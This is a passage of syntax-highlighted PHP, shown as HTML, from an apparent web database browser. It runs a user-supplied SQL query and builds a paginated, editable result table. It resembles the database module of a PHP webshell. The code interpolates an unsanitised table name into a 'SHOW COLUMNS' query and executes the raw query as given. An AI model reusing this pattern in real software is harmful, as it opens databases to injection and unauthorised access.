<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tatol</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_num_rows(q(</span>$<span style="color: #eeeeec;">getnumsql</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> = <span style="color: #eeeeec; background-color: #2e3436;">multi(</span>$<span style="color: #eeeeec;">tatol</span>, $<span style="color: #eeeeec;">pagenum</span>, $<span style="color: #eeeeec;">page</span>, $<span style="color: #eeeeec;">tablename</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">tablename</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">sql_line</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(array(</span><span style="color: #ad7fa8; font-style: italic;">"\r"</span>, <span style="color: #ad7fa8; font-style: italic;">"\n"</span>, <span style="color: #ad7fa8; font-style: italic;">"\t"</span>), <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">' '</span>, <span style="color: #ad7fa8; font-style: italic;">' '</span>, <span style="color: #ad7fa8; font-style: italic;">' '</span>), <span style="color: #eeeeec; background-color: #2e3436;">trim(htmlspecialchars(</span>$<span style="color: #eeeeec;">query</span>)));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">sql_line</span> = <span style="color: #eeeeec; background-color: #2e3436;">preg_replace(</span><span style="color: #ad7fa8; font-style: italic;">"/\/\*[^(\*\/)]*\*\//i"</span>, <span style="color: #ad7fa8; font-style: italic;">" "</span>, $<span style="color: #eeeeec;">sql_line</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">preg_match_all(</span><span style="color: #ad7fa8; font-style: italic;">"/from\s+`{0,1}([\w]+)`{0,1}\s+/i"</span>,$<span style="color: #eeeeec;">sql_line</span>,$<span style="color: #eeeeec;">matches</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tablename</span> = $<span style="color: #eeeeec;">matches</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>][<span style="color: #eeeeec; background-color: #2e3436;">0</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">/*********************/</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">getfield</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW COLUMNS FROM $tablename"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">keyfied</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>; <span style="color: #888a85;">//</span><span style="color: #888a85;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">row</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_assoc(</span>$<span style="color: #eeeeec;">getfield</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>]][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] = $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>]][<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>] = $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'UNI'</span> || $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'PRI'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">keyfied</span> = $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">/*********************/</span><span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">keyfied</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">strtolower(substr(</span>$<span style="color: #eeeeec;">query</span>,<span style="color: #eeeeec; background-color: #2e3436;">0</span>,<span style="color: #eeeeec; background-color: #2e3436;">13</span>)) == <span style="color: #ad7fa8; font-style: italic;">'select * from'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">query</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">" LIMIT "</span>, <span style="color: #ad7fa8; font-style: italic;">" order by $keyfied DESC LIMIT "</span>, $<span style="color: #eeeeec;">query</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span>$<span style="color: #eeeeec;">query</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">multipage</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">allowedit</span>) <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fieldnum</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_num_fields(</span>$<span style="color: #eeeeec;">result</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;$<span style="color: #eeeeec;">i</span>&lt;$<span style="color: #eeeeec;">fieldnum</span>;$<span style="color: #eeeeec;">i</span>++){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">name</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_name(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">type</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_type(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">len</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_len(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
